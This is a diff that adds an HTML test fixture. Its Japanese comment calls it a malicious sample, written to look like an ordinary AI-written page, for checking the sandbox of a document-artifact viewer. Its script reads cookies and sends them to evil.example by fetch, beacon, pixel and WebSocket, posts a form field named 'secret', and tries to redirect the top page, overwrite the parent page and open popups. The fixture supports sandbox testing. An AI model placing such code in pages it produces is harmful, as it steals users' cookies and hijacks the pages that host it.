@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Malicious: Plain Document</title>
+<!-- 悪意のある見本（README.md）：AI が書いたふつうの文書の形で、枠の外へ出ようとする。文書の作品（DOC001）の枠の守りを確かめる -->
+<link rel="stylesheet" href="https://evil.example/head.css">
+<script src="https://evil.example/head.js"></script>
+<style>
+  body { margin: 0; padding: 24px; font: 16px system-ui, sans-serif; background: #fff7ed; color: #1f1f23; }
+  button { margin: 4px; }
+</style>
+</head>
+<body>
+<h1 id="title">Plain document</h1>
+<p>Count: <output id="count">0</output></p>
+<button id="inc" type="button">Count up</button>
+<button id="fetch" type="button">Send out</button>
+<button id="top" type="button">Move the top page</button>
+<button id="parent" type="button">Touch the parent</button>
+<button id="open" type="button">Open a window</button>
+<button id="nav" type="button">Move the frame</button>
+<form id="form" action="https://evil.example/form" method="post"><input name="secret" value="ld-synthetic-input"><button id="submit" type="submit">Send the form</button></form>
+<a id="link" href="https://evil.example/link">Outside link</a>
+<img src="https://evil.example/img.png" alt="">
+<script>
+  // ふつうの AI の書き方：document で探し、localStorage に覚える
+  const html = document.documentElement;
+  const note = (key, value) => html.setAttribute('data-' + key, String(value));
+  let count = 0;
+  try { count = Number(localStorage.getItem('count') || '0'); } catch (e) { note('storage-error', e.name); }
+  const out = document.getElementById('count');
+  out.textContent = String(count);
+  document.getElementById('inc').addEventListener('click', () => {
+    count += 1;
+    localStorage.setItem('count', String(count));
+    out.textContent = String(count);
+  });
+  document.getElementById('fetch').addEventListener('click', async () => {
+    let cookie = 'threw';
+    try { cookie = document.cookie; } catch (e) {}
+    note('cookie', cookie);
+    try { await fetch('https://evil.example/fetch?c=' + encodeURIComponent(cookie)); note('fetch', 'sent'); } catch (e) { note('fetch', 'blocked'); }
+    try { navigator.sendBeacon('https://evil.example/beacon', cookie); } catch (e) {}
+    new Image().src = 'https://evil.example/pixel?c=' + encodeURIComponent(cookie);
+    try { const ws = new WebSocket('wss://evil.example/ws'); ws.onerror = () => note('ws', 'blocked'); } catch (e) { note('ws', 'blocked'); }
+    try { await fetch('/api/me'); note('site-api', 'sent'); } catch (e) { note('site-api', 'blocked'); }
+    note('fetch-done', 1);
+  });
+  document.getElementById('top').addEventListener('click', () => {
+    try { window.top.location.href = 'https://evil.example/top'; note('top', 'tried'); } catch (e) { note('top', e.name); }
+  });
+  document.getElementById('parent').addEventListener('click', () => {
+    try { window.parent.document.body.innerHTML = 'owned'; note('parent', 'wrote'); } catch (e) { note('parent', e.name); }
+  });
+  document.getElementById('open').addEventListener('click', () => {
+    let opened = null;
+    try { opened = window.open('https://evil.example/popup'); } catch (e) { note('open', e.name); return; }
+    note('open', opened ? 'opened' : 'null');
+  });
+  document.getElementById('nav').addEventListener('click', () => { location.href = 'https://evil.example/moved'; });
+  note('ready', 1);
+</script>
+</body>
+</html>
